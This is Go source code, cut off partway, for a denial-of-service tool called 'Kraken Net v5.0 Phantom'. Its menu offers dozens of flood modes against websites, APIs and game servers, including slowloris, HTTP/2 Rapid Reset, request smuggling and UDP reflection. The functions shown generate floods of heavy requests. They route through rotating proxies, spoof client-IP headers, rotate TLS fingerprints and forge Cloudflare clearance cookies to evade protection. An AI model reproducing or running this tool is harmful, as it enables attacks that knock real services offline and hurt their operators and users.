package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const (
	Reset    = "\033[0m"
	Red      = "\033[0;31m"
	RedLight = "\033[91m"
	Green    = "\033[32m"
	Yellow   = "\033[33m"
	Cyan     = "\033[36m"
	Magenta  = "\033[35m"
	White    = "\033[37m"
	Gray     = "\033[90m"
	BRed     = "\033[1;31m"
	BGreen   = "\033[1;32m"
	BYellow  = "\033[1;33m"
	BCyan    = "\033[1;36m"
	BWhite   = "\033[1;37m"
	BMagenta = "\033[1;35m"
	BBlue    = "\033[1;34m"
	Blue     = "\033[34m"
	Orange   = "\033[38;5;208m"
	BOrange  = "\033[1;38;5;208m"
	Purple   = "\033[38;5;135m"
	BPurple  = "\033[1;38;5;135m"
)

var (
	userAgents  []string
	referers    []string
	proxies     []string
	target      string
	connections int
	workers     int
	port        int
	durationSec int

	totalSuccess int64
	totalFail    int64
	totalBytes   int64
	totalReq     int64
	peakRPS      float64
	lastReq      int64
	lastTick     time.Time
	attackStart  time.Time

	statsMu    sync.Mutex
	rpsHistory [30]float64
	rpsIdx     int
)

var defaultUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Dalvik/2.1.0 (Linux; U; Android 14; SM-G998B Build/UP1A.231005.007)",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
}

var defaultReferers = []string{
	"https://www.google.com/",
	"https://www.google.com/search?q=",
	"https://www.bing.com/",
	"https://duckduckgo.com/",
	"https://www.facebook.com/",
	"https://t.co/",
	"https://www.reddit.com/",
	"https://github.com/",
	"https://www.youtube.com/",
	"https://www.twitter.com/",
	"https://news.ycombinator.com/",
	"https://www.linkedin.com/",
}

var httpPaths = []string{
	"/", "/index.php", "/index.html", "/api", "/login", "/admin", "/wp-login.php",
	"/api/v1/users", "/search", "/.env", "/config.php", "/wp-admin/",
	"/api/v1/data", "/robots.txt", "/favicon.ico", "/static/",
	"/assets/", "/js/", "/css/", "/images/", "/uploads/",
	"/api/auth", "/api/token", "/graphql", "/rest/", "/v1/",
	"/api/v2/", "/health", "/status", "/metrics", "/debug/",
	"/.git/config", "/phpinfo.php", "/info.php", "/server-status",
	"/xmlrpc.php", "/wp-json/wp/v2/users", "/.well-known/security.txt",
	"/admin/config", "/administrator/", "/phpmyadmin/",
	"/actuator/health", "/actuator/env", "/swagger-ui/", "/api-docs",
	"/v2/api-docs", "/_ah/health", "/readiness", "/liveness",
}

var apiEndpoints = []string{
	"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit",
	"/api/v1/auth", "/api/v1/search", "/api/v1/events", "/api/v1/webhook",
	"/api/v3/users", "/graphql/v1", "/api/v1/upload", "/api/v2/auth",
}

var postPayloads = []string{
	`{"username":"admin","password":"password"}`,
	`{"email":"test@test.com","message":"hello"}`,
	`{"data":"AAAAAAA","type":"test"}`,
	`{"action":"login","user":"admin","pass":"admin123"}`,
	strings.Repeat("A", 1024),
	strings.Repeat("B", 2048),
}

var discordPayloads = [][]byte{
	[]byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffgetstatus xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffgetchallenge xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffrcon \"\" \"\"\x00\x00\x00"),
}

var tlsFingerprints = []struct {
	CipherSuites []uint16
	NextProtos   []string
	MinVersion   uint16
}{
	{
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		NextProtos: []string{"h2", "http/1.1"},
		MinVersion: tls.VersionTLS13,
	},
	{
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		NextProtos: []string{"h2", "http/1.1"},
		MinVersion: tls.VersionTLS12,
	},
	{
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		NextProtos: []string{"http/1.1"},
		MinVersion: tls.VersionTLS12,
	},
}

type bypassHeader struct {
	Key   string
	Value string
	Rand  bool
}

var bypassHeaders = []bypassHeader{
	{Key: "X-Forwarded-For", Value: "127.0.0.1", Rand: true},
	{Key: "CF-Connecting-IP", Value: "127.0.0.1", Rand: true},
	{Key: "X-Real-IP", Value: "127.0.0.1", Rand: true},
	{Key: "True-Client-IP", Value: "127.0.0.1", Rand: true},
	{Key: "X-Forwarded-Host", Value: "localhost"},
	{Key: "X-Host", Value: "localhost"},
	{Key: "X-Forwarded-Server", Value: "localhost"},
	{Key: "X-HTTP-Host-Override", Value: "localhost"},
	{Key: "Forwarded", Value: "for=127.0.0.1;by=127.0.0.1"},
	{Key: "X-Original-URL", Value: "/"},
	{Key: "X-Rewrite-URL", Value: "/"},
	{Key: "X-Forwarded-Proto", Value: "https"},
	{Key: "X-Forwarded-Port", Value: "443"},
	{Key: "X-Cluster-Client-IP", Value: "127.0.0.1", Rand: true},
	{Key: "X-Client-IP", Value: "127.0.0.1", Rand: true},
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9,en-US;q=0.8",
	"zh-CN,zh;q=0.9,en;q=0.8",
	"de-DE,de;q=0.9,en-US;q=0.8",
	"fr-FR,fr;q=0.9,en;q=0.8",
	"ja,en-US;q=0.9,en;q=0.8",
	"ko-KR,ko;q=0.9,en;q=0.8",
	"ru-RU,ru;q=0.9,en;q=0.8",
}

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func printBanner() {
	banner := `
              ...-%@@@@@@@-..               
             .:%@@@@@@@@@@@@%-.             
            .#@@@@@@@@@@@@@@@@#.            
           .%@@@@@@@@@@@@@@@@@@%.           
           :@@@@@@@@@@@@@@@@@@@@:           
 ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. 
:@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-
@#.  -@@@- :@@@@@@@@@@@@@@@@@@@@:.:@@@-  .#@
:-. .%@@@: .@@@@@@@@@@@@@@@@@@@@..:@@@%. .-:
   .*@@@=:@:.@@@@@@@@@@@@@@@@@@.:@:=@@@#.   
  .#@@@+ .#+.=@@@@@@@@@@@@@@@@=.+%..+@@@#.  
 .%@@@#..#@...##@@@@@@@@@@@@##. .%#..#@@@%. 
.*@@@@. *@*  -@@@@@@@@@@@@@@@@- .+@*..@@@@*.
-@@@@@. %@@:..*@.*@@@@@@@@*.%* .:@@@..@@@@@-
=@@@@@: %@@@@@#@@@@@@@@@@@@@@%@@@@@%.:@@@@@+
=@@@@@@=.+@%+%@@@@@@@@@@@@@@@@@=%@+.=@@@@@@=
.@@@@@@@@@@@@+@@@@@@@@@@@@@@@@+@@@@@@@@@@@@.
 .*@@@@==*@@#@@%#@@@@@@@@@@#%@@#@@#=-@@@@*..
 .:#@@@@@+@@-@=%@@@@@@@@@@@@%=@-@@+@@@@@#:..
:@@@@@@@@=@@:#@@@@@@@##@@@@@@@%.@@=@@@@@@@@:
#@@@@@-:.*-@@@@@@@@@- .-@@@@@@@@@-*.:-@@@@@#
#@@@@@@@%-@@@@@@@%... ....%@@@@@@@-%@@@@@@@#
:@@@@@@@-%@@@@@:  =@@::@@=  :@@@@@%:@@@@@@@:
 .-@@@@@:@@@@@-    .@%%@.    -@@@@@:@@@@@-..
         #@@@@#....*@..@#....#@@@@#.        
         .%@@@@@@@@@+ .+@@@@@@@@@%.         
          .:@@@@@@+.   ..+@@@@@@:.          
`
	fmt.Println(RedLight + banner + Reset)
	fmt.Println()
	fmt.Println("   " + BCyan + "K R A K E N   N E T" + Reset + "   " + BWhite + "v5.0 PHANTOM" + Reset)
	fmt.Println("   " + Gray + "Full Spectrum Layer 7 | by Piwiii2.0" + Reset)
	fmt.Printf("   %sRuntime:%s Go %s | %sCPU:%s %d cores\n",
		Gray, Reset, runtime.Version(), Gray, Reset, runtime.NumCPU())
	fmt.Println()
}

func mhead(title, color string) {
	d := 43 - len(title)
	if d < 0 {
		d = 0
	}
	fmt.Println(color + "┌─ " + title + " " + strings.Repeat("─", d) + "┐" + Reset)
}

func mrow(name, desc string) {
	p1 := 14 - len(name)
	p2 := 31 - len(desc)
	if p1 < 0 {
		p1 = 0
	}
	if p2 < 0 {
		p2 = 0
	}
	fmt.Println("│ " + BWhite + name + Reset + strings.Repeat(" ", p1) + desc + strings.Repeat(" ", p2) + "│")
}

func mfoot(color string) {
	fmt.Println(color + "└" + strings.Repeat("─", 46) + "┘" + Reset)
}

func printMenu() {
	fmt.Println()
	mhead("TLS / HTTP", Cyan)
	mrow("kraken", "TLS multi-request flood")
	mrow("tls", "Standard TLS flood")
	mrow("http-flood", "HTTP GET/POST flood")
	mrow("https-flood", "HTTPS TLS flood")
	mrow("api-flood", "JSON API heavy payloads")
	mrow("header-flood", "Massive header flood")
	mrow("mixpost", "Mixed content-type POST")
	mrow("cf-bypass", "Browser-like CF bypass")
	mrow("range", "Range header abuse")
	mrow("cookie-bomb", "500 cookies per request")
	mrow("cache-bust", "Cache-busting param flood")
	mrow("tls-exhaust", "TLS handshake exhaust")
	mrow("phantom-get", "Rotating UA+IP+path GET")
	mfoot(Cyan)
	fmt.Println()
	mhead("ADVANCED LAYER 7", Yellow)
	mrow("slowloris", "Slow HTTP headers hold")
	mrow("rudy", "R.U.D.Y slow POST body")
	mrow("rapid-reset", "HTTP/2 Rapid Reset")
	mrow("h2-cont", "HTTP/2 CONTINUATION")
	mrow("chunk-post", "Chunked drip POST")
	mrow("ws-flood", "WebSocket message flood")
	mrow("malformed", "Malformed long URL")
	mrow("http-smuggle", "HTTP request smuggling")
	mrow("idle-h2", "H2 idle stream exhaust")
	mfoot(Yellow)
	fmt.Println()
	mhead("UDP", Magenta)
	mrow("udp-discord", "Quake3 query flood")
	mrow("udp-bypass", "Random payload flood")
	mrow("udp-gbps", "High bandwidth flood")
	mrow("udp-amp", "Reflection-style flood")
	mrow("fivem", "FiveM getinfo flood")
	mfoot(Magenta)
	fmt.Println()
	mhead("GAME", Green)
	mrow("minecraft", "Minecraft handshake flood")
	mrow("gmod", "Garry's Mod query flood")
	mrow("cs2", "CS2 A2S_INFO flood")
	mfoot(Green)
	fmt.Println()
	mhead("ULTIMATE", RedLight)
	mrow("hybrid", "TLS + API + WS + H2 reset")
	mrow("apocalypse", "All vectors maximum")
	mrow("phantom", "Rotating all methods auto")
	mfoot(RedLight)
	fmt.Println()
}

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, defaultUserAgents[rand.Intn(len(defaultUserAgents))])
}

func randomReferer() string {
	return randomFromList(referers, defaultReferers[rand.Intn(len(defaultReferers))])
}

func randomMethod() string {
	switch rand.Intn(12) {
	case 0, 1:
		return "POST"
	case 2:
		return "HEAD"
	case 3:
		return "OPTIONS"
	case 4:
		return "PUT"
	case 5:
		return "PATCH"
	default:
		return "GET"
	}
}

func randomPath() string {
	if rand.Intn(2) == 0 {
		return httpPaths[rand.Intn(len(httpPaths))]
	}
	b := make([]byte, rand.Intn(20)+5)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return "/" + string(b)
}

func randomPostPayload() string {
	return postPayloads[rand.Intn(len(postPayloads))]
}

func randomBypassHeader() (string, string) {
	h := bypassHeaders[rand.Intn(len(bypassHeaders))]
	if h.Rand && rand.Intn(2) == 0 {
		return h.Key, randomIP()
	}
	return h.Key, h.Value
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(254)+1)
}

func randomIPv6() string {
	groups := make([]string, 8)
	for i := range groups {
		groups[i] = fmt.Sprintf("%04x", rand.Intn(65536))
	}
	return strings.Join(groups, ":")
}

func randString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func randEmail() string {
	domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
	return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
}

func randomAcceptLanguage() string {
	return acceptLanguages[rand.Intn(len(acceptLanguages))]
}

func randomTLSConfig(serverName string) *tls.Config {
	fp := tlsFingerprints[rand.Intn(len(tlsFingerprints))]
	return &tls.Config{
		ServerName:         serverName,
		InsecureSkipVerify: true,
		CipherSuites:       fp.CipherSuites,
		NextProtos:         fp.NextProtos,
		MinVersion:         fp.MinVersion,
	}
}

func formatBytes(b float64) string {
	units := []string{"B", "KB", "MB", "GB", "TB"}
	i := 0
	for b >= 1024 && i < len(units)-1 {
		b /= 1024
		i++
	}
	return fmt.Sprintf("%.2f %s", b, units[i])
}

func formatDuration(d time.Duration) string {
	m := int(d.Minutes())
	s := int(d.Seconds()) % 60
	return fmt.Sprintf("%02dm:%02ds", m, s)
}

func parseTarget(targetURL string) (string, string, string, string) {
	u, err := url.Parse(targetURL)
	if err != nil || u.Host == "" {
		return "https", targetURL, "443", "/"
	}
	scheme := u.Scheme
	host := u.Hostname()
	p := u.Port()
	path := u.RequestURI()
	if path == "" {
		path = "/"
	}
	if p == "" {
		if scheme == "https" {
			p = "443"
		} else {
			p = "80"
		}
	}
	return scheme, host, p, path
}

func dialTarget(host, p string) (net.Conn, error) {
	addr := net.JoinHostPort(host, p)
	if len(proxies) > 0 {
		px := proxies[rand.Intn(len(proxies))]
		pURL, err := url.Parse(px)
		if err != nil {
			return nil, err
		}
		rawConn, err := net.DialTimeout("tcp", pURL.Host, 5*time.Second)
		if err != nil {
			return nil, err
		}
		connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if pURL.User != nil {
			user := pURL.User.Username()
			pass, _ := pURL.User.Password()
			cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
			connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
		}
		connectReq += "\r\n"
		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
			rawConn.Close()
			return nil, err
		}
		br := bufio.NewReader(rawConn)
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			rawConn.Close()
			return nil, err
		}
		resp.Body.Close()
		if resp.StatusCode != 200 {
			rawConn.Close()
			return nil, fmt.Errorf("proxy connect failed: %d", resp.StatusCode)
		}
		return rawConn, nil
	}
	return net.DialTimeout("tcp", addr, 5*time.Second)
}

func newHTTPClientTLSWithProxy(proxyStr string, conns int) *http.Client {
	var proxyURL *url.URL
	if proxyStr != "" {
		proxyURL, _ = url.Parse(proxyStr)
	}
	fp := tlsFingerprints[rand.Intn(len(tlsFingerprints))]
	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		MaxIdleConns:        conns * 4,
		MaxIdleConnsPerHost: conns * 4,
		MaxConnsPerHost:     conns * 4,
		IdleConnTimeout:     30 * time.Second,
		DisableCompression:  true,
		ForceAttemptHTTP2:   true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			CipherSuites:       fp.CipherSuites,
			NextProtos:         fp.NextProtos,
			MinVersion:         fp.MinVersion,
		},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func newNoTimeoutClient() *http.Client {
	base := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
	c := *base
	c.Timeout = 0
	if t, ok := base.Transport.(*http.Transport); ok {
		tc := t.Clone()
		tc.ResponseHeaderTimeout = 0
		tc.IdleConnTimeout = 0
		c.Transport = tc
	}
	return &c
}

func setCommonHeaders(req *http.Request) {
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", randomAcceptLanguage())
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Pragma", "no-cache")
	hk, hv := randomBypassHeader()
	req.Header.Set(hk, hv)
	req.Header.Set("Cookie", "session="+randString(32)+"; _ga="+randString(12)+"; _gid="+randString(10))
	if rand.Intn(3) == 0 {
		req.Header.Set("X-Forwarded-For", randomIP()+", "+randomIP()+", "+randomIP())
	}
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	method := randomMethod()
	path := randomPath()
	var body io.Reader
	if method == "POST" || method == "PUT" || method == "PATCH" {
		body = strings.NewReader(randomPostPayload())
	}
	req, err := http.NewRequest(method, baseURL+path, body)
	if err != nil {
		return false
	}
	setCommonHeaders(req)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	n, _ := io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	atomic.AddInt64(&totalBytes, n)
	return resp.StatusCode < 500
}

func cacheBustRequest(client *http.Client, baseURL string) bool {
	bust := fmt.Sprintf("?_=%d&cb=%s&v=%d", time.Now().UnixNano(), randString(8), rand.Intn(999999))
	req, err := http.NewRequest("GET", baseURL+randomPath()+bust, nil)
	if err != nil {
		return false
	}
	setCommonHeaders(req)
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Expires", "0")
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	n, _ := io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	atomic.AddInt64(&totalBytes, n)
	return resp.StatusCode < 500
}

func phantomGetRequest(client *http.Client, baseURL string) bool {
	methods := []string{"GET", "HEAD", "OPTIONS"}
	method := methods[rand.Intn(len(methods))]
	path := randomPath()
	if rand.Intn(4) == 0 {
		path += "?" + randString(5) + "=" + randString(10)
	}
	req, err := http.NewRequest(method, baseURL+path, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept-Language", randomAcceptLanguage())
	req.Header.Set("X-Forwarded-For", randomIP())
	req.Header.Set("CF-Connecting-IP", randomIP())
	req.Header.Set("True-Client-IP", randomIP())
	if rand.Intn(2) == 0 {
		req.Header.Set("X-Forwarded-For",
			fmt.Sprintf("%s, %s, %s", randomIP(), randomIP(), randomIP()))
	}
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Cookie", "session="+randString(24))
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	n, _ := io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	atomic.AddInt64(&totalBytes, n)
	return resp.StatusCode < 500
}

func genAPIPayload() string {
	generators := []func() string{
		func() string {
			bioLen := 2000 + rand.Intn(8000)
			return fmt.Sprintf(
				`{"user_id":"%d","action":"update_profile","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
				rand.Intn(9999999), randString(bioLen), randString(32), randEmail(), randString(12+rand.Intn(20)),
			)
		},
		func() string {
			var sb strings.Builder
			n := 500 + rand.Intn(4500)
			sb.WriteString(`{"action":"bulk_insert","token":"`)
			sb.WriteString(randString(64))
			sb.WriteString(`","items":[`)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte(',')
				}
				fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
					rand.Intn(9999999), randString(8+rand.Intn(16)), randString(20+rand.Intn(100)))
			}
			sb.WriteString(`]}`)
			return sb.String()
		},
		func() string {
			depth := 20 + rand.Intn(30)
			var sb strings.Builder
			for i := 0; i < depth; i++ {
				fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+rand.Intn(200)))
			}
			sb.WriteString(`{"end":true}`)
			for i := 0; i < depth; i++ {
				sb.WriteString(`}}`)
			}
			return sb.String()
		},
		func() string {
			return fmt.Sprintf(
				`{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","data":"%s"}}}}`,
				rand.Intn(9999999), randString(16), randString(3000+rand.Intn(5000)),
				randString(8), randString(5), randString(1000+rand.Intn(4000)),
			)
		},
		func() string {
			return fmt.Sprintf(
				`{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s","fingerprint":"%s"}`,
				randEmail(), randString(16+rand.Intn(32)), rand.Intn(999999), randString(36), randString(64),
			)
		},
		func() string {
			var sb strings.Builder
			n := 100 + rand.Intn(500)
			sb.WriteString(`{"batch":[`)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte(',')
				}
				fmt.Fprintf(&sb, `{"op":"upsert","table":"users","data":{"id":%d,"payload":"%s"}}`,
					rand.Intn(9999999), randString(100+rand.Intn(900)))
			}
			sb.WriteString(`]}`)
			return sb.String()
		},
	}
	return generators[rand.Intn(len(generators))]()
}

func apiFloodRequest(client *http.Client, targetURL string) bool {
	body := genAPIPayload()
	fullURL := targetURL + apiEndpoints[rand.Intn(len(apiEndpoints))]
	req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Request-ID", randString(32))
	req.Header.Set("Authorization", "Bearer "+randString(64))
	req.Header.Set("Origin", targetURL)
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Accept-Language", randomAcceptLanguage())
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(body)))
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func headerFloodRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	n := 50 + rand.Intn(50)
	for i := 0; i < n; i++ {
		req.Header.Set("X-"+randString(8), randString(512+rand.Intn(512)))
	}
	req.Header.Set("Cookie", strings.Repeat("x="+randString(50)+"; ", 30))
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func mixPostRequest(client *http.Client, targetURL string) bool {
	var body string
	var contentType string
	switch rand.Intn(6) {
	case 0:
		contentType = "application/json"
		body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), rand.Intn(9999), randString(32))
	case 1:
		contentType = "application/xml"
		body = fmt.Sprintf(`<?xml version="1.0"?><root><data>%s</data><id>%d</id></root>`, randString(500), rand.Intn(9999))
	case 2:
		contentType = "application/x-www-form-urlencoded"
		body = "data=" + randString(500) + "&id=" + strconv.Itoa(rand.Intn(9999))
	case 3:
		contentType = "text/plain"
		body = randString(800)
	case 4:
		contentType = "multipart/form-data; boundary=----" + randString(16)
		body = "------" + randString(16) + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x.txt\"\r\n\r\n" + randString(2000) + "\r\n------" + randString(16) + "--"
	case 5:
		contentType = "application/graphql"
		body = fmt.Sprintf(`{ user(id: "%s") { name email bio } }`, randString(16))
	}
	req, err := http.NewRequest("POST", targetURL+randomPath(), strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(body)))
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func cfBypassRequest(client *http.Client, targetURL string) bool {
	sep := "?"
	if strings.Contains(targetURL, "?") {
		sep = "&"
	}
	fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.Intn(9999))
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", randomAcceptLanguage())
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Cookie", "cf_clearance="+randString(43)+"; __cf_bm="+randString(36)+"; _cfuvid="+randString(40))
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func rangeRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	var ranges []string
	for i := 0; i < 128; i++ {
		ranges = append(ranges, fmt.Sprintf("%d-%d", i*1000, i*1000+999))
	}
	req.Header.Set("Range", "bytes="+strings.Join(ranges, ","))
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func cookieBombRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
